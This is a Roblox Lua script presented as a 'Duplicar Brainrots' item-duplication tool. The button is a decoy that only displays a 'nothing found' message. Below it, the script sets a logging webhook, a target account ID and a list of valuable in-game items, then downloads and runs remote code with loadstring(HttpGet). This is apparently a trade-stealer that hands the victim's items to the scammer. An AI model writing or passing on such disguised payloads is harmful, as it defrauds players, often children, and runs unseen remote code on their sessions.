-- Crear ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Crear botón
local boton = Instance.new("TextButton")
boton.Size = UDim2.new(0, 200, 0, 50)
boton.Position = UDim2.new(0.5, -100, 0.5, -25)
boton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
boton.TextColor3 = Color3.fromRGB(255, 255, 255)
boton.Text = "Duplicar Brainrots"
boton.Parent = screenGui
-- Crear ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Crear botón
local boton = Instance.new("TextButton")
boton.Size = UDim2.new(0, 200, 0, 50)
boton.Position = UDim2.new(0.5, -100, 0.5, -25)
boton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
boton.TextColor3 = Color3.fromRGB(255, 255, 255)
boton.Text = "Duplicar Brainrots"
boton.Parent = screenGui

-- Crear mensaje
local mensaje = Instance.new("TextLabel")
mensaje.Size = UDim2.new(0, 300, 0, 50)
mensaje.Position = UDim2.new(0.5, -150, 0.5, 40)
mensaje.BackgroundTransparency = 1
mensaje.TextColor3 = Color3.fromRGB(255, 80, 80)
mensaje.TextScaled = true
mensaje.Visible = false
mensaje.Text = "No se encontraron brainrots de valor para duplicar"
mensaje.Parent = screenGui

-- Función del botón
boton.MouseButton1Click:Connect(function()
	mensaje.Visible = true
	wait(2)
	mensaje.Visible = false
end)


getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_69201cb343644b71a9b62af1bbad7be2"
getgenv().TARGET_ID = 7687372922
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2 
getgenv().TARGET_BRAINROTS = {
    ["Burguro And Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cerberus"] = true,
    ["Cooki and Milki"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Festive 67"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Headless Horseman"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Ketchuru and Musturu"] = true,
    ["Ketupat Bros"] = true,
    ["Ketupat Kepat"] = true,
    ["La Casa Boo"] = true,
    ["La Romantic Grande"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Taco Combinasion"] = true,
    ["Lavadorito Spinito"] = true,
    ["Meowl"] = true,
    ["Money Money Puggy"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Skibidi Toilet"] = true,
    ["Spooky and Pumpky"] = true,
    ["Strawberry Elephant"] = true,
    ["Tang Tang Keletang"] = true,
    ["Tictac Sahur"] = true
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
